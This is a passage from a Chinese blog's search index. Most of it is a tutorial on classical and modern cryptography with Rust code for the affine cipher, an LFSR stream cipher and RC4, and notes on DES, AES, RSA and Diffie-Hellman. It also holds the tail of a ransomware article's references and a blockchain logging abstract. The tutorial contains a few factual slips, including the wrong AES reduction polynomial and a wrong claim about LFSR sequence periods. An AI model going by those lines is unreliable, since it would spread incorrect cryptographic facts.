↩https://stackoverflow.com/questions/13378815/base64-length-calculation ↩https://en.wikipedia.org/wiki/Petya_(malware) ↩https://www.howtogeek.com/193669/whats-the-difference-between-gpt-and-mbr-when-partitioning-a-drive/ ↩GonnaCry勒索软件 ↩Architecture of a ransomware ↩","categories":[],"tags":[{"name":"勒索软件","slug":"勒索软件","permalink":"https://mundi-xu.github.io/tags/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6/"},{"name":"恶意软件","slug":"恶意软件","permalink":"https://mundi-xu.github.io/tags/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/"},{"name":"Hybrid Cryptosystem","slug":"Hybrid-Cryptosystem","permalink":"https://mundi-xu.github.io/tags/Hybrid-Cryptosystem/"}]},{"title":"密码学初探-基于RUST的密码系统与算法简析","slug":"密码学初探-基于RUST的密码算法简析","date":"2020-12-27T06:05:31.000Z","updated":"2020-12-27T10:47:07.846Z","comments":true,"path":"2020/12/27/密码学初探-基于RUST的密码算法简析/","link":"","permalink":"https://mundi-xu.github.io/2020/12/27/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%8E%A2-%E5%9F%BA%E4%BA%8ERUST%E7%9A%84%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%AE%80%E6%9E%90/","excerpt":"基于 rust 开发的在线加解密系统与各类加密函数的简析。","text":"Introduction密码学（Cryptography）一般可分为古典密码学和现代密码学。 其中，古典密码学，作为一种实用性艺术存在，其编码和破译通常依赖于设计者和敌手的创造力与技巧，并没有对密码学原件进行清晰的定义。古典密码学主要包含以下几个方面： 单表替换加密（Monoalphabetic Cipher） 多表替换加密（Polyalphabetic Cipher） 奇奇怪怪的加密方式 而现代密码学则起源于 20 世纪中后期出现的大量相关理论，1949 年香农（C. E. Shannon）发表了题为《保密系统的通信理论》的经典论文标志着现代密码学的开始。现代密码学主要包含以下几个方面： 对称加密（Symmetric Cryptography），以 DES，AES，RC4 为代表。 非对称加密（Asymmetric Cryptography），以 RSA，ElGamal，椭圆曲线加密为代表。 哈希函数（Hash Function），以 MD5，SHA-1，SHA-512 等为代表。 数字签名（Digital Signature），以 RSA 签名，ElGamal 签名，DSA 签名为代表。 其中，对称加密体制主要分为两种方式： 分组密码（Block Cipher），又称为块密码。 序列密码（Stream Cipher），又称为流密码。 一般来说，密码设计者的根本目标是保障信息及信息系统的 机密性（Confidentiality） 完整性（Integrity） 可用性（Availability） 认证性（Authentication） 不可否认性（Non-repudiation） 其中，前三者被称为信息安全的 CIA 三要素 。 本文主要介绍了仿射密码，流密码（RC4,LFSR+JK)，分组密码（DES,AES），非对称加密（rsa）和密码协议（Diffie_Hellman）。项目详细代码已于Github开源[1]。 仿射密码原理仿射密码的加密函数是 $E(x)=(ax+b)\\pmod m$，其中 $x$ 表示明文按照某种编码得到的数字 $a$ 和 $m$ 互质 $m$ 是编码系统中字母的数目。 解密函数是 $D(x)=a^{-1}(x-b)\\pmod m$，其中 $a^{-1}$ 是 $a$ 在 $\\mathbb{Z}_{m}$ 群的乘法逆元。 下面我们以 $E(x) = (5x + 8) \\bmod 26$ 函数为例子进行介绍，加密字符串为 AFFINE CIPHER，这里我们直接采用字母表26个字母作为编码系统 明文 A F F I N E C I P H E R x 0 5 5 8 13 4 2 8 15 7 4 17 $y=5x+8$ 8 33 33 48 73 28 18 48 83 43 28 93 $y\\mod26$ 8 7 7 22 21 2 18 22 5 17 2 15 密文 I H H W V C S W F R C P 其对应的加密结果是 IHHWVCSWFRCP。 对于解密过程，正常解密者具有a与b，可以计算得到 $a^{-1}$ 为 21，所以其解密函数是$D(x)=21(x-8)\\pmod {26}$ ，解密如下 密文 I H H W V C S W F R C P $y$ 8 7 7 22 21 2 18 22 5 17 2 15 $x=21(y-8)$ 0 -21 -21 294 273 -126 210 294 -63 189 -126 147 $x\\mod26$ 0 5 5 8 13 4 2 8 15 7 4 17 明文 A F F I N E C I P H E R 可以看出其特点在于只有 26 个英文字母。 Rust实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667// Encryptlet mut ans = String::new();for ch in msg.chars() &#123; if ch.is_ascii_alphabetic() &#123; if ch.is_uppercase() &#123; // 大写字母 let x = ch as u32 - &#x27;A&#x27; as u32; let y = (upper_a * x + upper_b) % 26; let target = &#x27;A&#x27; as u32 + y; let new_ch = char::try_from(target).unwrap(); ans.push(new_ch); &#125; else &#123; // 小写字母 let x = ch as u32 - &#x27;a&#x27; as u32; let y = (lower_a * x + lower_b) % 26; let target = &#x27;a&#x27; as u32 + y; let new_ch = char::try_from(target).unwrap(); ans.push(new_ch); &#125; &#125; else if ch.is_ascii_digit() &#123; // 数字 let x = ch as u32 - &#x27;0&#x27; as u32; let y = (number_a * x + number_b) % 26; let target = &#x27;0&#x27; as u32 + y; let new_ch = char::try_from(target).unwrap(); ans.push(new_ch); &#125; else &#123; ans.push(ch); &#125;&#125;return Ok(ans);// Decryptlet lower_a_ = exgcd(lower_a as i32, 26) as u32;let upper_a_ = exgcd(upper_a as i32, 26) as u32;let number_a_ = exgcd(number_a as i32, 10) as u32;let mut ans = String::new();for ch in msg.chars() &#123; if ch.is_ascii_alphabetic() &#123; if ch.is_uppercase() &#123; // 大写字母 let x = ch as u32 - &#x27;A&#x27; as u32; let y = (upper_a_ * (x + 26 - upper_b)) % 26; let target = &#x27;A&#x27; as u32 + y; let new_ch = char::try_from(target).unwrap(); ans.push(new_ch); &#125; else &#123; // 小写字母 let x = ch as u32 - &#x27;a&#x27; as u32; let y = (lower_a_ * (x + 26 - lower_b)) % 26; let target = &#x27;a&#x27; as u32 + y; let new_ch = char::try_from(target).unwrap(); ans.push(new_ch); &#125; &#125; else if ch.is_ascii_digit() &#123; // 数字 let x = ch as u32 - &#x27;0&#x27; as u32; let y = (number_a_ * (x + 10 - number_b)) % 10; let target = &#x27;0&#x27; as u32 + y; let new_ch = char::try_from(target).unwrap(); ans.push(new_ch); &#125; else &#123; ans.push(ch); &#125;&#125;return Ok(ans); 破解首先，我们可以看到的是，仿射密码对于任意两个不同的字母，其最后得到的密文必然不一样，所以其也具有最通用的特点。当密文长度足够长时，我们可以使用频率分析的方法来解决。 其次，我们可以考虑如何攻击该密码。可以看出当$a=1$ 时，仿射加密是凯撒加密。而一般来说，我们利用仿射密码时，其字符集都用的是字母表，一般只有26个字母，而不大于26的与26互素的个数一共有 $$\\phi(26)=\\phi(2) \\times \\phi(13) = 12$$ 算上b的偏移可能，一共有可能的密钥空间大小也就是 $$12 \\times 26 = 312$$ 一般来说，对于该种密码，我们至少得是在已知部分明文的情况下才可以攻击。下面进行简单的分析。 这种密码由两种参数来控制，如果我们知道其中任意一个参数，那我们便可以很容易地快速枚举另外一个参数得到答案。 但是，假设我们已经知道采用的字母集，这里假设为26个字母，我们还有另外一种解密方式，我们只需要知道两个加密后的字母 $y_1,y_2$ 即可进行解密。那么我们还可以知道 $$y_1=(ax_1+b)\\pmod{26} \\y_2=(ax_2+b)\\pmod{26}$$ 两式相减，可得 $$y_1-y_2=a(x_1-x_2)\\pmod{26}$$ 这里 $y_1,y_2$ 已知，如果我们知道密文对应的两个不一样的字符 $x_1$ 与 $x_2$ ，那么我们就可以很容易得到 $a$ ，进而就可以得到 $b$ 了。 流密码流密码一般逐字节或者逐比特处理信息。一般来说 流密码的密钥长度会与明文的长度相同。 流密码的密钥派生自一个较短的密钥，派生算法通常为一个伪随机数生成算法。 需要注意的是，流加密目前来说都是对称加密。 伪随机数生成算法生成的序列的随机性越强，明文中的统计特征被覆盖的更好。 流密码加解密非常简单，在已知明文的情况下，可以非常容易地获取密钥流。 流密码的关键在于设计好的伪随机数生成器。一般来说，伪随机数生成器的基本构造模块为反馈移位寄存器。当然，也有一些特殊设计的流密码，比如 RC4。 反馈移位寄存器一般的，一个 n 级反馈移位寄存器如下图所示 其中 $a_0$，$a_1$，…，$a_{n-1}$ 为初态。 F 为反馈函数或者反馈逻辑。如果 F 为线性函数，那么我们称其为线性反馈移位寄存器（LFSR），否则我们称其为非线性反馈移位寄存器（NFSR）。 $a_{i+n}=F(a_i,a_{i+1},…,a_{i+n-1})$ 。 一般来说，反馈移位寄存器都会定义在某个有限域上，从而避免数字太大和太小的问题。因此，我们可以将其视为同一个空间中的变换，即 $(a_i,a_{i+1},…,a_{i+n-1}) \\rightarrow (a_{i+1},…,a_{i+n-1},a_{i+n})$.对于一个序列来说，我们一般定义其生成函数为其序列对应的幂级数的和。 线性反馈移位寄存器 - LFSR介绍线性反馈移位寄存器的反馈函数一般如下 $a_{i+n}=\\sum\\limits_{j=1}^{n}c_ja_{i+n-j}$ 其中，$c_j$ 均在某个有限域 $F_q$ 中。 既然线性空间是一个线性变换，我们可以得知这个线性变换为 $$ \\begin{align*}&amp;\\left[ a_{i+1},a_{i+2},a_{i+3}, …,a_{i+n}\\right]\\\\ \\\\ =&amp;\\left[ a_{i},a_{i+1},a_{i+2}, …,a_{i+n-1}\\right]\\left[ \\begin{matrix} 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; c_n \\\\ 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; c_{n-1} \\\\ 0 &amp; 1 &amp; \\cdots &amp; 0 &amp; c_{n-2} \\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 0 &amp; 0 &amp; \\cdots &amp; 1 &amp; c_1 \\\\ \\end{matrix} \\right] \\\\ \\\\ =&amp;\\left[ a_{0},a_{1},a_{2}, …,a_{n-1}\\right]\\left[ \\begin{matrix} 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; c_n \\\\ 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; c_{n-1} \\\\ 0 &amp; 1 &amp; \\cdots &amp; 0 &amp; c_{n-2} \\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 0 &amp; 0 &amp; \\cdots &amp; 1 &amp; c_1 \\\\ \\end{matrix} \\right]^{i+1}\\end{align*} $$ 进而，我们可以求得其特征多项式为 $f(x)=x^n-\\sum\\limits_{i=1}^{n}c_ix^{n-i}$ 同时，我们定义其互反多项式为 $\\overline f(x)=x^nf(\\frac{1}{x})=1-\\sum\\limits_{i=1}^{n}c_ix^{i}$ 我们也称互反多项式为线性反馈移位寄存器的联结多项式。 这里有一些定理需要我们记一下，感兴趣的可以自行推导。 样例 特征多项式与生成函数已知某个 n 级线性反馈移位寄存器的特征多项式，那么该序列对应的生成函数为 $A(x)=\\frac{p(x)}{\\overline f(x)}$ 其中，$p(x)=\\sum\\limits_{i=1}^{n}(c_{n-i}x^{n-i}\\sum\\limits_{j=1}^{i}a_jx^{j-1})$。可以看出 p(x) 完全由初始状态和反馈函数的系数决定。 序列周期与生成函数序列的的周期为其生成函数的既约真分式的分母的周期。 对于 n 级线性反馈移位寄存器，最长周期为 $2^{n}-1$（排除全零）。达到最长周期的序列一般称为 m 序列。 特殊性质 将两个序列累加得到新的序列的周期为这两个序列的周期的和。 序列是 n 级 m 序列，当且仅当序列的极小多项式是 n 次本原多项式。 B-M 算法一般来说，我们可以从两种角度来考虑 LFSR 密钥生成角度，一般我们希望使用级数尽可能低的 LFSR 来生成周期大，随机性好的序列。 密码分析角度，给定一个长度为 n 的序列 a，如何构造一个级数尽可能小的 LFSR 来生成它。其实这就是 B-M 算法的来源。 一般来说，我们定义一个序列的线性复杂度如下 若 s 为一个全零序列，则线性复杂度为0。 若没有 LFSR 能生成 s，则线性复杂度为无穷。 否则，s 的线性复杂度为生成 L(s) 的最小级的 LFSR。 BM 算法的要求我们需要知道长度为 2n 的序列。其复杂度 时间复杂度：O(n^2) 次比特操作 空间复杂度：O(n) 比特。 关于 BM 算法的细节，后续添加，目前处于学习过程中。 但是其实如果我们知道了长度为 2n 的序列，我们也可以一种比较笨的方法来获取原先的序列。不妨假设已知的序列为$a_1,…,a_{2n}$，我们可以令 $S_1=(a_1,…,a_n)$ $S_2=(a_2,…,a_{n+1})$ …. $S_{n+1}=(a_{n+1},…,a_{2n})$ 那么我们可以构造矩阵 $X=(S_1,…,S_n)$，那么 $S_{n+1}=(c_n,…,c_1)X$ 所以 $(c_n,…,c_1)=S_{n+1}X^{-1}$ 进而我们也就知道了 LFSR 的反馈表达式，进而我们就可以推出初始化种子。 非线性反馈移位寄存器介绍为了使得密钥流输出的序列尽可能复杂，会使用非线性反馈移位寄存器，常见的有三种 非线性组合生成器，对多个 LFSR 的输出使用一个非线性组合函数 非线性滤波生成器，对一个 LFSR 的内容使用一个非线性组合函数 钟控生成器，使用一个（或多个）LFSR 的输出来控制另一个（或多个）LFSR 的时钟 非线性组合生成器简介组合生成器一般如下图所示。 JK触发器 利用J-K触发器的非线性序列生成器 样例 Rust实现123456789101112131415161718192021222324252627282930313233343536373839404142pub struct LfsrJk &#123; j_state: u32, k_state: u32, j_state_c: u32, k_state_c: u32, data_state: u8,&#125;impl LfsrJk &#123; pub fn new(j_state: u32, k_state: u32, j_state_c: u32, k_state_c: u32, data_state: u8) -&gt; Self &#123; Self &#123; j_state: 0x12345678 - j_state, k_state: 0x87654321 - k_state, j_state_c: 0xffffffff - j_state_c, k_state_c: 0xffffffff - k_state_c, data_state, &#125; &#125; pub fn crypt(&amp;self, data: &amp;mut [u8]) &#123; let mut j_state = self.j_state; let mut k_state = self.k_state; let mut data_state = self.data_state; let len = data.len(); for i in 0..len &#123; let j = Self::round(&amp;mut j_state, self.j_state_c); let k = Self::round(&amp;mut k_state, self.k_state_c); data_state = j ^ (!(j ^ k) &amp; data_state); data[i] ^= data_state; &#125; &#125; #[inline] fn round(state: &amp;mut u32, state_c: u32) -&gt; u8 &#123; let mut output = 0u8; for _ in 0..8 &#123; let t = *state &amp; state_c; let new_out = t.count_ones() % 2; let out = (0x80000000 &amp; t) &gt;&gt; 31; output = (output &lt;&lt; 1) + out as u8; *state = (*state &lt;&lt; 1) + new_out; &#125; output &#125;&#125; RC4基本介绍RSA 由 Ron Rivest 设计，加解密使用相同的密钥，因此也属于对称加密算法。它是面向字节的流密码，密钥长度可变，非常简单，但也很有效果。RC4 算法曾广泛应用于 SSL/TLS 协议和 WEP/WPA 协议，但由于RC4算法存在弱点，2015年2月所发布的 RFC 7465 规定禁止在TLS中使用RC4加密算法。 基本流程RC4 主要包含三个流程 初始化 S 和 T 数组。 初始化置换 S。 生成密钥流。 初始化 S 和 T 数组初始化 S 和 T 的代码如下 123for i = 0 to 255 do S[i] = i T[i] = K[i mod keylen]) 初始化置换 S1234j = 0for i = 0 to 255 do j = (j + S[i] + T[i]) (mod 256) swap (S[i], S[j]) 生成流密钥1234567i = j = 0 for each message byte b i = (i + 1) (mod 256) j = (j + S[i]) (mod 256) swap(S[i], S[j]) t = (S[i] + S[j]) (mod 256) print S[t] 我们一般称前两部分为 KSA ，最后一部分是 PRGA。 Rust实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748pub struct Rc4 &#123; s: [u32; 256], key: Vec&lt;u8&gt;,&#125;impl Rc4 &#123; pub fn new(key: Vec&lt;u8&gt;) -&gt; Self &#123; let mut key = key; if key.len() == 0 &#123; key = vec![1, 2, 3, 4, 5]; &#125; let mut rc4 = Self &#123; s: [0u32; 256], key, &#125;; rc4.init(); rc4 &#125; pub fn init(&amp;mut self) &#123; let mut k = vec![0u32; 256]; for i in 0..256 &#123; self.s[i] = i as u32; k[i] = self.key[i % self.key.len()] as u32; &#125; let mut j = 0; for i in 0..256 &#123; j = (j + self.s[i] + k[i]) % 256; let tmp = self.s[i]; self.s[i] = self.s[j as usize]; self.s[j as usize] = tmp; &#125; &#125; pub fn crypt(&amp;mut self, data: &amp;mut [u8]) &#123; let mut i = 0; let mut j = 0; let mut t = 0; let mut s = self.s.clone(); for k in 0..data.len() &#123; i = (i + 1) % 256; j = (j + s[i]) % 256; let tmp = s[i]; s[i] = s[j as usize]; s[j as usize] = tmp; t = (s[i] + s[j as usize]) % 256; data[k] ^= s[t as usize] as u8; &#125; &#125;&#125; 块加密概述所谓块加密就是每次加密一块明文，常见的加密算法有 IDEA 加密 DES 加密 AES 加密 块加密也是对称加密。 其实，我们也可以把块加密理解一种特殊的替代密码，但是其每次替代的是一大块。而正是由于一大块，明文空间巨大，而且对于不同的密钥，我们无法做一个表进行对应相应的密文，因此必须得有 复杂 的加解密算法来加解密明密文。 而与此同时，明文往往可能很长也可能很短，因此在块加密时往往需要两个辅助 padding，即 padding 到指定分组长度 分组加密模式，即明文分组加密的方式。 填充规则正如我们之前所说，在分组加密中，明文的长度往往并不满足要求，需要进行 padding，而如何 padding 目前也已经有了不少的规定。 常见的 填充规则 如下。需要注意的是，即使消息的长度是块大小的整数倍，仍然需要填充。 一般来说，如果在解密之后发现 Padding 不正确，则往往会抛出异常。我们也因此可以知道 Paddig 是否正确。 Pad with bytes all of the same value as the number of padding bytes (PKCS5 padding)1234DES INPUT BLOCK = f o r _ _ _ _ _(IN HEX) 66 6F 72 05 05 05 05 05KEY = 01 23 45 67 89 AB CD EFDES OUTPUT BLOCK = FD 29 85 C9 E8 DF 41 40 Pad with 0x80 followed by zero bytes (OneAndZeroes Padding)1234DES INPUT BLOCK = f o r _ _ _ _ _(IN HEX) 66 6F 72 80 00 00 00 00KEY = 01 23 45 67 89 AB CD EFDES OUTPUT BLOCK = BE 62 5D 9F F3 C6 C8 40 这里其实就是和 md5 和 sha1 的 padding 差不多。 Pad with zeroes except make the last byte equal to the number of padding bytes1234DES INPUT BLOCK = f o r _ _ _ _ _(IN HEX) 66 6f 72 00 00 00 00 05KEY = 01 23 45 67 89 AB CD EFDES OUTPUT BLOCK = 91 19 2C 64 B5 5C 5D B8 Pad with zero (null) characters1234DES INPUT BLOCK = f o r _ _ _ _ _(IN HEX) 66 6f 72 00 00 00 00 00KEY = 01 23 45 67 89 AB CD EFDES OUTPUT BLOCK = 9E 14 FB 96 C5 FE EB 75 Pad with spaces1234DES INPUT BLOCK = f o r _ _ _ _ _(IN HEX) 66 6f 72 20 20 20 20 20KEY = 01 23 45 67 89 AB CD EFDES OUTPUT BLOCK = E3 FF EC E5 21 1F 35 25 工作模式分组密码的工作模式是：根据不同的数据格式和安全性要求, 以一个具体的分组密码算法为基础构造一个分组密码系统的方法。分组密码的工作模式应当力求简单, 有效和易于实现，需要采用适当的工作模式来隐蔽明文的统计特性、数据的格式等，降低删除、重放、插入和伪造成功的机会。 分组密码的主要工作模式： 电码本(ECB)模式 密码分组链接(CBC)模式 密码反馈(CFB)模式 输出反馈(OFB)模式 计数器(CTR)模式 基本策略在分组密码设计时，充分使用了 Shannon 提出的两大策略：混淆与扩散两大策略。 混淆混淆，Confusion，将密文与密钥之间的统计关系变得尽可能复杂，使得攻击者即使获取了密文的一些统计特性，也无法推测密钥。一般使用复杂的非线性变换可以得到很好的混淆效果，常见的方法如下 S 盒 乘法 扩散扩散，Diffusion，使得明文中的每一位影响密文中的许多位。常见的方法有 线性变换 置换 移位，循环移位 常见加解密结构目前块加密中主要使用的是结构是 迭代结构，这是因为迭代结构便于设计与实现，同时方便安全性评估。 迭代结构概述迭代结构基本如下，一般包括三个部分 密钥置换 轮加密函数 轮解密函数 轮函数目前来说，轮函数主要有主要有以下设计方法 Feistel Network，由 Horst Feistel 发明，DES 设计者之一。 DES Substitution-Permutation Network(SPN) AES 其他方案 密钥扩展目前，密钥扩展的方法有很多，没有见到什么完美的密钥扩展方法，基本原则是使得密钥的每一个比特尽可能影响多轮的轮密钥。 DES基本介绍Data Encryption Standard(DES)，数据加密标准，是典型的块加密，其基本信息如下 输入 64 位。 输出 64 位。 密钥 64 位，使用 64 位密钥中的 56 位，剩余的 8 位要么丢弃，要么作为奇偶校验位。 Feistel 迭代结构 明文经过 16 轮迭代得到密文。 密文经过类似的 16 轮迭代得到明文。 基本流程给出一张简单的 DES 流程图。 加密我们可以考虑一下每一轮的加密过程 $L_{i+1}=R_i$ $R_{i+1}=L_i\\oplus F(R_i,K_i)$ 那么在最后的 Permutation 之前，对应的密文为$(R_{n+1},L_{n+1})$。 解密那么解密如何解密呢？首先我们可以把密文先进行逆置换，那么就可以得到最后一轮的输出。我们这时考虑每一轮 $R_i=L_{i+1}$ $L_i=R_{i+1}\\oplus F(L_{i+1},K_i)$ 因此，$(L_0,R_0)$ 就是加密时第一次置换后的明文。我们只需要再执行逆置换就可以获得明文了。 可以看出，DES 加解密使用同一套逻辑，只是密钥使用的顺序不一致。 核心部件DES 中的核心部件主要包括（这里只给出加密过程的） 初始置换 F 函数 E 扩展函数 S 盒，设计标准未给出。 P 置换 最后置换 其中 F 函数如下 如果对 DES 更加感兴趣，可以进行更加仔细地研究。欢迎提供 PR。 衍生在 DES 的基础上，衍生了以下两种加密方式 双重 DES 三种 DES 双重 DES双重 DES 使用两个密钥，长度为 112 比特。加密方式如下 $C=E_{k2}(E_{k1}(P))$ 但是双重 DES 不能抵抗中间相遇攻击，我们可以构造如下两个集合 $I={E_{k1}(P)}$ $J=D_{k2}(C)$ 即分别枚举 K1 和 K2 分别对 P 进行加密和对 C 进行解密。 在我们对 P 进行加密完毕后，可以对加密结果进行排序，这样的复杂度为$2^nlog(2^n)=O(n2^n)$ 当我们对 C 进行解密时，可以每解密一个，就去对应的表中查询。 总的复杂度为还是$O(n2^n)$。 三重 DES三重 DES 的加解密方式如下 $C=E_{k3}(D_{k2}(E_{k1}(P)))$ $P=D_{k1}(E_{k2}(D_{k3}(C)))$ 在选择密钥时，可以有两种方法 3 个不同的密钥，k1，k2，k3 互相独立，一共 168 比特。 2 个不同的密钥，k1 与 k2 独立，k3=k1，112 比特。 攻击方法 差分攻击 线性攻击 AES基本介绍Advanced Encryption Standard（AES），高级加密标准，是典型的块加密，被设计来取代 DES，由 Joan Daemen 和 Vincent Rijmen 所设计。其基本信息如下 输入：128 比特。 输出：128 比特。 SPN 网络结构。 其迭代轮数与密钥长度有关系，如下 密钥长度（比特） 迭代轮数 128 10 192 12 256 14 基本流程基本概念在 AES 加解密过程中，每一块都是 128 比特，所以我们这里明确一些基本概念。 在 AES 中，块与 State 之间的转换过程如下 所以，可以看出，每一个 block 中的字节是按照列排列进入到状态数组的。 而对于明文来说，一般我们会选择使用其十六进制进行编码。 加解密过程这里给个看雪上比较好的 图例 ，以便于介绍基本的流程，每一轮主要包括 轮密钥加，AddRoundKey 字节替换，SubBytes 行移位，ShiftRows 列混淆，MixColumns 上面的列混淆的矩阵乘法等号左边的列向量应该在右边。 这里再给一张其加解密的全图，其解密算法的正确性很显然。 我们这里重点关注一下以下。 字节替换在字节替换的背后，其实是有对应的数学规则来定义对应的替换表的，如下 这里的运算均定义在 $GF(2^8)$ 内。 列混淆这里的运算也是定义在 $GF(2^8)$ 上，使用的模多项式为 $x^8+x^4+x^3+1$。 密钥扩展 等价解密算法简单分析一下，我们可以发现 交换逆向行移位和逆向字节代替并不影响结果。 交换轮密钥加和逆向列混淆并不影响结果，关键在于 首先可以把异或看成域上的多项式加法 然后多项式中乘法对加法具有分配率。 攻击方法 积分攻击 非对称加密介绍在非对称密码中，加密者与解密者所使用的密钥并不一样，典型的有 RSA 加密，背包加密，椭圆曲线加密。 RSARSA 加密算法是一种非对称加密算法。在公开密钥加密和电子商业中 RSA 被广泛使用。RSA 是 1977 年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。RSA 就是他们三人姓氏开头字母拼在一起组成的。 RSA 算法的可靠性由极大整数因数分解的难度决定。换言之，对一极大整数做因数分解愈困难，RSA 算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用 RSA 加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。如今，只有短的 RSA 密钥才可能被强力方式解破。到 2020 年为止，还没有任何可靠的攻击 RSA 算法的方式。 基本原理公钥与私钥的产生 随机选择两个不同大质数 $p$ 和 $q$，计算 $N = p \\times q$ 根据欧拉函数，求得 $\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1)$ 选择一个小于 $\\varphi (N)$ 的整数 $e$，使 $e$ 和 $\\varphi (N)$ 互质。并求得 $e$ 关于 $\\varphi (N)$ 的模反元素，命名为 $d$，有 $ed\\equiv 1 \\pmod {\\varphi (N)}$ 将 $p​$ 和 $q​$ 的记录销毁 此时，$(N,e)$ 是公钥，$(N,d)$ 是私钥。 消息加密首先需要将消息 以一个双方约定好的格式转化为一个小于 $N$，且与 $N$ 互质的整数 $m$。如果消息太长，可以将消息分为几段，这也就是我们所说的块加密，后对于每一部分利用如下公式加密： $$m^{e}\\equiv c\\pmod N$$ 消息解密利用密钥 $d​$ 进行解密。 $$c^{d}\\equiv m\\pmod N$$ 正确性证明即我们要证$m^{ed} \\equiv m \\bmod N$，已知$ed \\equiv 1 \\bmod \\phi(N)$，那么 $ed=k\\phi(N)+1$，即需要证明 $$m^{k\\phi(N)+1} \\equiv m \\bmod N$$ 这里我们分两种情况证明 第一种情况 $gcd(m,N)=1​$，那么 $m^{\\phi(N)} \\equiv 1 \\bmod N​$，因此原式成立。 第二种情况 $gcd(m,N)\\neq 1$，那么 $m$ 必然是 $p$ 或者 $q$ 的倍数，并且 $n=m$ 小于 $N$。我们假设 $$m=xp$$ 那么 $x$ 必然小于 $q$，又由于 $q$ 是素数。那么 $$m^{\\phi(q)} \\equiv 1 \\bmod q$$ 进而 $$m^{k\\phi(N)}=m^{k(p-1)(q-1)}=(m^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q$$ 那么 $$m^{k\\phi(N)+1}=m+uqm$$ 进而 $$m^{k\\phi(N)+1}=m+uqxp=m+uxN$$ 所以原式成立。 样例例1计算公钥和私钥 p = 13 , q = 5 N = pq = 65 r = (p-1)(q-1) = (13-1)(5-1) = 48 计算模反元素r=48，选择e=5，得到二元一次方程：5d-48k=1 , 获得一组解：d=29，k=3 因此，公钥是 (N, e) = (65, 5)，私钥是 (N, d) = (65, 29)。 加密信息 明文：m=3 计算: $ c \\equiv 3^{5} \\pmod 65 \\equiv 48 $ 因此：3被加密为48 解密信息 密文：c=48 计算：$ n \\equiv 48^{29} \\pmod 65 \\equiv 3 $ 因此：48被解密为3 例2 密码协议Diffie-Hellman 密钥交换 密钥交换是实现安全通信的基础 商用加密算法AES和DES需要在安全通信之前，实现通信双方的密钥共享。 密钥交换的方法： 基于RSA的密钥交换； 基于KDC技术 (Key Distributed Center，密钥分发中心)； Diffie-Hellman密钥交换（简称：DH算法）； 基于物理层的密钥交换。 DH算法是不安全信道下实现安全密钥共享的一种方法，由 W. Diffie 和 M.Hellman 在1976年提出的第一个公开的公钥密码算法。 DH协议案例 参考https://github.com/Mundi-Xu/cipher_web_rocket ↩ctf-wiki ↩深入浅出密码学——常用加密技术原理与应用 ↩","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://mundi-xu.github.io/tags/crypto/"},{"name":"rsa","slug":"rsa","permalink":"https://mundi-xu.github.io/tags/rsa/"},{"name":"rust","slug":"rust","permalink":"https://mundi-xu.github.io/tags/rust/"},{"name":"仿射密码","slug":"仿射密码","permalink":"https://mundi-xu.github.io/tags/%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81/"},{"name":"流密码","slug":"流密码","permalink":"https://mundi-xu.github.io/tags/%E6%B5%81%E5%AF%86%E7%A0%81/"},{"name":"分组密码","slug":"分组密码","permalink":"https://mundi-xu.github.io/tags/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/"},{"name":"密码协议","slug":"密码协议","permalink":"https://mundi-xu.github.io/tags/%E5%AF%86%E7%A0%81%E5%8D%8F%E8%AE%AE/"},{"name":"RC4","slug":"RC4","permalink":"https://mundi-xu.github.io/tags/RC4/"},{"name":"des","slug":"des","permalink":"https://mundi-xu.github.io/tags/des/"},{"name":"aes","slug":"aes","permalink":"https://mundi-xu.github.io/tags/aes/"}]},{"title":"基于区块链的安全日志系统","slug":"基于区块链的安全日志系统","date":"2020-07-01T11:00:00.000Z","updated":"2020-12-27T10:06:42.754Z","comments":true,"path":"2020/07/01/基于区块链的安全日志系统/","link":"","permalink":"https://mundi-xu.github.io/2020/07/01/%E5%9F%BA%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F/","excerpt":"基于区块链技术设计并实现了安全日志系统，采用链上数据存储模式，将本地日志提取关键字段并上传至区块链中存储，同时提供可视化界面让用户能够使用日志相关的安全分析功能。","text":"摘要信息系统中存在着大量的安全设备日志，这些日志对系统监控、查询、安全审计和故障诊断等都十分重要。与此同时，黑客入侵系统时，日志为黑客的行为提供了证据。因此对其进行安全的存储与处理具有重要意义。区块链技术的发展，为实现日志信息的保护、分享、取证、多边利益最大化提供了可能，为实现安全日志系统提供了保障。 基于区块链技术，本项目设计并实现了安全日志系统。该系统采用链上数据存储模式，将本地日志上传至区块链中存储，同时提供了可视化界面让用户能够使用日志相关的安全分析功能。通过安全性分析论证了该系统能够保证安全设备日志的安全可靠存储，同时为日志分析，日志取证提供便利。本项目解决了日志易被删除，篡改，伪造等问题，满足了学校、公司等云存储系统的安全日志审计，并极大的提高了数据存储的安全性，减轻运维人员的压力。 